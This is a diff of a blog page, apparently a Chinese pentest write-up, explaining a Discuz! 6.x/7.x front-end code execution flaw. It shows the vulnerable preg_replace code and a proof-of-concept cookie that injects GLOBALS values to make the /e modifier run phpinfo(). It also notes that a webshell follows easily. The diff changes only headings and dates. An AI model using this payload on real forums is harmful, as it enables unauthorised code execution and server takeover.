@@ -28,7 +28,7 @@
 <meta property="og:description" content="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞漏洞原理由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x&#x2F;7.x 全局变量防御绕过漏洞。 include&#x2F;global.func.php代码里： &lt;code id&#x3D;&quot;code0&quot;&gt;function daddslashes($string,">
 <meta property="og:image" content="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg">
 <meta property="article:published_time" content="2016-05-13T16:54:00.000Z">
-<meta property="article:modified_time" content="2019-07-25T06:30:17.000Z">
+<meta property="article:modified_time" content="2020-06-09T02:09:08.201Z">
 <meta property="article:author" content="Groot">
 <meta property="article:tag" content="pentest">
 <meta property="article:tag" content="discuz">
@@ -184,7 +184,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:30:17" itemprop="dateModified" datetime="2019-07-25T14:30:17+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:09:08" itemprop="dateModified" datetime="2020-06-09T10:09:08+08:00">2020-06-09</time>
               </span>
 
           
@@ -200,7 +200,7 @@
       
         <a id="more"></a>
 
-<h2 id="Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><a href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞" class="headerlink" title="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞"></a>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>
+<h2 id="Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><a href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞" class="headerlink" title="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞"></a>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>
 <p>include/global.func.php代码里：</p>
 <pre><code>&lt;code id=&quot;code0&quot;&gt;function daddslashes($string, $force = 0) {
         !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());
@@ -225,7 +225,7 @@
         exit(&apos;Request tainting attempted.&apos;);
 }</code></pre><p>这样就没法提交GLOBALS变量了么？</p>
 <p>$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我们就可以通过COOKIE来提交GLOBALS变量了:)</p>
-<h1 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h1><p>include/discuzcode.func.php</p>
+<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>include/discuzcode.func.php</p>
 <pre><code>function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) {
         global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
         if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[ /code]&apos;) || strpos($message, &apos;[ /CODE]&apos;)) !== FALSE) {
@@ -246,9 +246,9 @@
         $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);
         }
         ......</code></pre><p>119行 ：</p>
-<pre><code>$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行</code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1" target="_blank" rel="noopener">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
+<pre><code>$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1" target="_blank" rel="noopener">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
 <pre><code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></pre><p>如有漏洞，即可看到效果.<br>写个shell 自然也不是问题了~</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt=""></p>
 
     </div>
 
@@ -333,7 +333,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><span class="nav-number">1.</span> <span class="nav-text">Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞原理"><span class="nav-number"></span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞位置"><span class="nav-number"></span> <span class="nav-text">漏洞位置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-number"></span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number"></span> <span class="nav-text">参考</span></a></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><span class="nav-number">1.</span> <span class="nav-text">Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞位置"><span class="nav-number">3.</span> <span class="nav-text">漏洞位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">4.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
